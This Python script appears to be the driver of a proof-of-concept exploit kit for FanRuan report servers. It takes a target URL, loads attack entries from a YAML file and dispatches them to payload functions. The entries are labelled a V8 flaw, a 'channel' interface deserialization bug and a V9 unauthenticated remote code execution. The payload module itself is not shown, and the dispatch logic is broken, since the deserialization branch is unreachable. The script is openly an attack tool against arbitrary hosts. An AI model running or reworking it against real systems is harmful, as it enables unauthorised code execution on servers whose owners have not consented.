import requests
import yaml
import sys
from DataHandler import urlHandler as urlHandler
from urllib3.exceptions import InsecureRequestWarning
from payload import payload as payload

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def init():
    with open('PoC/poc.yml', 'r', encoding='utf-8') as stream:
        try:
            config = yaml.safe_load(stream)
        except yaml.YAMLError as exc:
            print(exc)

    if len(sys.argv) < 2:
        print("Usage: python3 exp.py <base_url>")
        sys.exit(1)

    base_url = sys.argv[1]
    endpoint = urlHandler.handle(base_url)

    attack(base_url, endpoint, config)


def attack(base_url, endpoint, config):
    for server in config['servers']:
        url = f"{base_url}{endpoint}"
        label = server['labels']
        version = server['version']
        params = server['params']
        method = server['method']
        if method == 'GET':

            payload.webReport_v8_vul(base_url, url, params, version, label)

        elif method == 'GET' and label == 'channel 接口反序列化漏洞':

            payload.webReport_channel_vul(base_url)

        elif method == 'POST' and version == '帆软报表 V9 ' and label == '前台未授权 RCE':

            payload.webReport_v9_vul(server, endpoint, base_url, url, params, version, label)


init()
